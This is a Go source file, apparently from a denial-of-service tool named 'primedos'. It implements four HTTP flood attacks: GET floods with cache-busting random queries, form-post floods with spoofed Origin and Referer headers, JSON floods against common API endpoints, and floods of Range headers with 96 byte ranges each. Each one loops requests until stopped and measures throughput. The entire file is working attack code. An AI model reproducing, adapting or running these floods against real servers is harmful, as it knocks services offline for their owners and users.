package vectors

import (
	"context"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	"primedos/internal/core"
)

func GetFlood(ctx context.Context, w *core.Worker) error {
	cl := w.S.NewHTTPClient()
	defer cl.CloseIdleConnections()

	for ctx.Err() == nil {
		path := w.S.RandomPath(w.R)
		sep := "?"
		if strings.Contains(path, "?") {
			sep = "&"
		}
		u := w.S.BaseURL() + path + sep + "__rnd=" + randHex(w.R, 10) + "&t=" + strconv.FormatInt(time.Now().UnixNano(), 36)
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			return err
		}
		w.S.ApplyHeaders(req, w.R)
		start := time.Now()
		resp, err := cl.Do(req)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		n, _ := io.Copy(io.Discard, io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()
		w.RTT(time.Since(start))
		payload := int(n) + 420 + len(path)
		w.Account(payload+core.WireOverhead(payload), payload, 2+int(n/1460), 1)
	}
	return nil
}

func PostFlood(ctx context.Context, w *core.Worker) error {
	cl := w.S.NewHTTPClient()
	defer cl.CloseIdleConnections()

	for ctx.Err() == nil {
		path := w.S.RandomPath(w.R)
		body := "q=" + randAlpha(w.R, 16) + "&submit=" + randAlpha(w.R, 8) + "&v=" + randHex(w.R, 24)
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, w.S.BaseURL()+path+"?__rnd="+randHex(w.R, 8), strings.NewReader(body))
		if err != nil {
			return err
		}
		w.S.ApplyHeaders(req, w.R)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Origin", w.S.BaseURL())
		req.Header.Set("Referer", w.S.BaseURL()+"/")
		start := time.Now()
		resp, err := cl.Do(req)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		n, _ := io.Copy(io.Discard, io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()
		w.RTT(time.Since(start))
		payload := int(n) + len(body) + 480 + len(path)
		w.Account(payload+core.WireOverhead(payload), payload, 3+int(n/1460), 1)
	}
	return nil
}

func APIFlood(ctx context.Context, w *core.Worker) error {
	cl := w.S.NewHTTPClient()
	defer cl.CloseIdleConnections()

	for ctx.Err() == nil {
		path := []string{"/api/v1/items", "/api/v1/search", "/api/v1/auth", "/api/graphql", "/api/v1/query"}[w.R.Intn(5)]
		body := `{"id":"` + randHex(w.R, 12) + `","filter":"` + randAlpha(w.R, 20) + `","limit":1,"depth":` + strconv.Itoa(w.R.Intn(50)+1) + `}`
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, w.S.BaseURL()+path, strings.NewReader(body))
		if err != nil {
			return err
		}
		w.S.ApplyHeaders(req, w.R)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Accept", "application/json")
		start := time.Now()
		resp, err := cl.Do(req)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		n, _ := io.Copy(io.Discard, io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()
		w.RTT(time.Since(start))
		payload := int(n) + len(body) + 420
		w.Account(payload+core.WireOverhead(payload), payload, 3+int(n/1460), 1)
	}
	return nil
}

func RangeFlood(ctx context.Context, w *core.Worker) error {
	cl := w.S.NewHTTPClient()
	defer cl.CloseIdleConnections()

	for ctx.Err() == nil {
		var sb strings.Builder
		sb.WriteString("bytes=")
		for i := 0; i < 96; i++ {
			if i > 0 {
				sb.WriteString(",")
			}
			off := w.R.Intn(1 << 20)
			sb.WriteString(strconv.Itoa(off))
			sb.WriteString("-")
			sb.WriteString(strconv.Itoa(off + w.R.Intn(64)))
		}
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, w.S.BaseURL()+w.S.RandomPath(w.R), nil)
		if err != nil {
			return err
		}
		w.S.ApplyHeaders(req, w.R)
		req.Header.Set("Range", sb.String())
		start := time.Now()
		resp, err := cl.Do(req)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		n, _ := io.Copy(io.Discard, io.LimitReader(resp.Body, 512*1024))
		resp.Body.Close()
		w.RTT(time.Since(start))
		payload := int(n) + sb.Len() + 420
		w.Account(payload+core.WireOverhead(payload), payload, 3+int(n/1460), 1)
	}
	return nil
}
